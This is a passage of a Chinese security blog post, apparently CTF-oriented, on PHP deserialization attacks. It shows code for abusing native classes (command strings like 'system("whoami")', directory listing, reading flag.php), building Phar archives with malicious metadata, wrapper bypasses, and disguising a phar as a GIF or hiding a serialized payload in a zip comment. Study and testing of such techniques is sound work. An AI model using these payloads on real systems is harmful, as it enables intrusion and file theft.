+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;system(&quot;whoami&quot;)&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;system(&quot;whoami&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h3><p>FilesystemIterator\DirectoryIterator\GlobIterator</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">FilesystemIterator</span> 和 <span class="built_in">DirectoryIterator</span> 用法</span><br><span class="line"><span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"><span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不需要glob协议头</span></span><br><span class="line"><span class="built_in">GlobIterator</span>(<span class="string">&quot;f*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&#x27;</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>SplFileObject</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SplFileObject</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Phar"><a href="#Phar" class="headerlink" title="Phar:&#x2F;&#x2F;"></a>Phar:&#x2F;&#x2F;</h2><p>Php通过 <code>__HALT_COMPILER</code> 来识别Phar文件</p>
+<p>生成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<p>Bypass</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">$phar-&gt;setStub(“GIF89a”.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //生成一个phar.phar，修改后缀名为phar.gif</span><br></pre></td></tr></table></figure>
+
+<p>zip</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar_file</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$phar_file</span>;</span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;crispr.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">setArchiveComment</span>(<span class="variable">$phar_file</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure>
+
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/07/30/pentest/web-pentest/Mysql Injections/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/06/25/others/IP Spoofing/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-06-30 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Php/">Php<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Php-Unserialize"><span class="toc-article-text">Php Unserialize</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-article-text">序列化</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8"><span class="toc-article-text">反序列化逃逸</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A2%9E%E5%A4%9A%E9%80%83%E9%80%B8"><span class="toc-article-text">增多逃逸</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%87%8F%E5%B0%91%E9%80%83%E9%80%B8"><span class="toc-article-text">减少逃逸</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Bypass"><span class="toc-article-text">Bypass</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#GC"><span class="toc-article-text">GC</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-article-text">原生类</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%8D%E5%B0%84"><span class="toc-article-text">反射</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="toc-article-text">异常处理</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95"><span class="toc-article-text">遍历目录</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-article-text">读取文件</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Phar"><span class="toc-article-text">Phar:&#x2F;&#x2F;</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
